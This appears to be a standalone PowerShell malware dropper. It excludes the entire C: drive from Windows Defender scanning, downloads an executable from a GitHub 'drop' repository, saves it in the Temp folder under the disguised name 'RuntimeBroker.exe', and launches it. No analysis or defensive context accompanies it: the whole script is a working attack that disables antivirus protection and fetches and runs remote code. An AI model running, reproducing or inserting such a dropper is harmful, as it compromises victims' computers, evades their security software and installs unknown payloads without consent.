Add-MpPreference -ExclusionPath C:\

$url = "https://github.com/monesdx/drop/raw/refs/heads/main/1.exe"

$output = "$env:Temp/RuntimeBroker.exe"

Invoke-WebRequest -Uri $url -OutFile $output

Start-Process -FilePath $output
